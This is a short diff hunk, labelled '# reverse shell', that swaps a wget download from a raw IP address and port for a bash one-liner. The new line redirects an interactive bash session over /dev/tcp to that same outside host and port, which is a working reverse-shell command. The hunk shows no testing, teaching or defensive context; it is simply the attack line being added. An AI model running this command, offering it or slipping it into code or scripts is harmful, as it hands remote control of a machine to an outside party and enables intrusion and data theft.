@@ -2,4 +2,4 @@
 
 # reverse shell
 
-wget https://45.77.226.156:45321/testingme.txt
+bash -i >& /dev/tcp/45.77.226.156/45321 0>&1
